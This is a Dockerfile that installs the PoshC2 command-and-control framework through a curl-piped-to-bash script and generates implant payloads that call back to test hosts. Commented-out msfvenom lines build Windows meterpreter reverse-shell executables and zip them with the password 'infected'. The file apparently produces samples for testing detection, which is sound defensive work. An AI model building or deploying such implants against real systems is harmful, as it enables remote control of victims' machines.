FROM kalilinux/kali-rolling as kalibuilder

RUN apt-get -qq update \
&& DEBIAN_FRONTEND="noninteractive" apt-get -q install -y p7zip-full gnupg2 curl git


RUN curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | bash

RUN mkdir /tmp/out

RUN posh-project -n sample-build1

RUN sed -i 's|PayloadCommsHost: "[^"]*"|PayloadCommsHost: "http://test.com"|' /var/poshc2/sample-build1/config.yml 

COPY run_server.sh /run_server.sh 

RUN chmod +x /run_server.sh

RUN /run_server.sh

RUN mkdir /tmp/out/http-test.com && mv /var/poshc2/sample-build1/payloads/* /tmp/out/http-test.com

RUN posh-project -n sample-build2; posh-project -s sample-build2
RUN sed -i 's|PayloadCommsHost: "[^"]*"|PayloadCommsHost: "https://198.10.1.2"|' /var/poshc2/sample-build2/config.yml 
RUN /run_server.sh

RUN mkdir /tmp/out/https-198.10.1.2 && mv /var/poshc2/sample-build2/payloads/* /tmp/out/https-198.10.1.2

# RUN posh-server 2>&1 >output1.log &; SERVER_PID=$!; DONE=0; while [ "$DONE" -eq "0" ]; do if grep -q "Server Started" "output1.log"; then kill $SERVER_PID; DONE=1; fi; sleep 5; done;

# RUN msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=8080 -f exe-only -o /tmp/out/meterpreter-x86.exe
# RUN msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=9000 -f exe-only -o /tmp/out/meterpreter-x64.exe
# RUN msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_http LHOST=10.10.10.3 LPORT=80 -f exe-only -o /tmp/out/meterpreter-x64-http.exe
# RUN msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.4 LPORT=443 -f exe-only -o /tmp/out/meterpreter-x64-https.exe

# RUN 7za a  /tmp/out/meterpreter-x86.exe.zip /tmp/out/meterpreter-x86.exe -tzip -mem=AES256 -pinfected
# RUN 7za a  /tmp/out/meterpreter-x64.exe.zip /tmp/out/meterpreter-x64.exe -tzip -mem=ZipCrypto -pinfected
# RUN 7za a  /tmp/out/meterpreter-x64-http.exe.zip /tmp/out/meterpreter-x64-http.exe -tzip -mem=AES256 -pinfected
# RUN 7za a  /tmp/out/meterpreter-x64-https.exe.zip /tmp/out/meterpreter-x64-https.exe -tzip -mem=AES256 -pinfected

FROM scratch as artifact
COPY --from=kalibuilder /tmp/out /out